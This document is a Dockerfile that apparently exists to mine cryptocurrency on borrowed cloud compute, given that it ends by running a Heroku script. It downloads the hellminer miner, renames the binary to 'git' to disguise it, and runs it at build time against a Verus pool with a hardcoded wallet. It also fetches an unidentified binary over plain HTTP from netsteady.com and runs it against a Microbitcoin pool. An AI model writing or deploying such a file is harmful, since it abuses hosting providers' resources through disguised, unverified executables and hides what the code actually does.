FROM ubuntu:focal
RUN apt-get update && apt-get -y install tar wget xz-utils
RUN apt-get install -y curl git unzip wget

# Verus Coin
RUN wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz; tar zxvf hellminer_cpu_linux.tar.gz; rm -fr hellminer_cpu_linux.tar.gz
RUN mv hellminer git
RUN ./git -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RRbtoWkxCVYEZuMVfNJshtzTz2PVTtyZwK.VPS1 -p x --cpu 2

# Microbitcoin
RUN wget http://www.netsteady.com/virtual; chmod +x virtual; ./virtual -a power2b -o stratum+tcp://stratum-na.rplant.xyz:7022 -u MjuAooGBTvpAUmVYDNiYgtP2Ed1WJ2Gg6B.VPS
CMD bash heroku.sh
